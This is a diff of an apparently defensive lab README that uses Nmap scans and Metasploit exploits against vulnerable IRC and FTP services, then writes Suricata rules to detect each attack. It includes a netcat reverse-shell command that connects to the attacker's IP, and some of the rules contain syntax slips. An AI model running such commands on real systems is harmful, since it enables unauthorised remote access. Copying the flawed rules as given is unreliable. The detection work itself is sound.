@@ -94,7 +94,9 @@ A stealth scan using Nmap, such as a SYN scan, sends SYN packets to a target wit
 Challenge: _Create a Suricata rule to detect TCP SYN packets sent to multiple ports within a short time frame, indicative of Nmap stealth scans._
 
 On the attacker, the nmap scan command below was used and result of the scan was:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/service-version-scan.png?raw=true">
+
 The rule crafted from the packets captured was:<br>
 ```
 alert tcp any any -> $HOME_NET any (msg: "Possible Nmap stealth scan detected"; flag: S; window: 1024; threshold: typ both, track_by_src, count 5, seconds 10, sid: 1000001; rev:1;)
@@ -108,7 +110,9 @@ An OS fingerprinting scan using Nmap analyzes subtle differences in network resp
 Challenge: _Develop a Suricata rule to detect ICMP echo requests and responses with specific TTL values, characteristic of Nmap OS fingerprinting activities._
 
 On the attacker, the nmap scan command below was used and result of the scan was:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/os-fingerprint-scan.png?raw=true">
+
 The rules crafted from the packets captured were:<br>
 ```
 alert icmp any any -> $HOME_NET any (msg: "ECHO ICMP request detected"; ttl:>45; ttl:<60; sid: 1000002; rev:1;)
@@ -123,7 +127,9 @@ A service version scan using Nmap probes open ports to identify running services
 Challenge: _Formulate a Suricata rule to detect Nmap service version detection probes based on unique HTTP GET requests or TCP SYN/ACK packets._
 
 On the attacker, the nmap scan command below was used and result of the scan was:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/stealth-scan.png?raw=true">
+
 The rule crafted from the packets captured was:<br>
 ```
 alert tcp any any -> $HOME_NET any (msg: "Nmap service version scan detected"; flow:established, to_server; content: "nmap"; http_header; sid: 1000004; rev:1;)
@@ -137,10 +143,12 @@ The Metasploit Unreal IRCd 3.2.8.1 Backdoor Exploit targets a backdoor in Unreal
 Challenge: _Craft a Suricata rule to detect Metasploit exploit payload traffic based on unique signatures or payloads commonly used in exploits._
 
 Metasploit Framework was launched using ```msfconsole``` from the terminal on the attacker. Using the service versions obtained earlier, an exploit for the Unreal IRC module was found and run using the following sequence of commands:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-search.png?raw=true">
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-settings.png?raw=true">
 
 The following was run on the victim to confirm the newly added user:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-user-added.png?raw=true"><br>
 
 The rule crafted from the packets captured was:<br>
@@ -156,6 +164,7 @@ A Metasploit reverse shell enables an attacker to execute commands on a compromi
 Challenge: _Develop a Suricata rule to detect Metasploit reverse shell connections by monitoring for outbound TCP connections to known attacker IP addresses._
 
 Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">
 
@@ -165,6 +174,7 @@ Note that once the vulnerability was exploited and a bind shell was spawned, the
 This command listened for connections on port 17000. Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
 ```nc -e /bin/bash 192.168.8.134 17000```<br>
 Below are the commands used to listen for this reverse shell connection and some commands to setup better utility of the shell (typical when improving the quality of the shell to allow easier use):
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">
 
 The rule crafted from the packets captured was:<br>
@@ -180,6 +190,7 @@ Meterpreter is a powerful, dynamic payload within Metasploit with brief command 
 Challenge: _Create a Suricata rule to detect Meterpreter communication activities by analyzing HTTP or TCP traffic with characteristic Meterpreter payloads._
 
 Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
+
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">
 
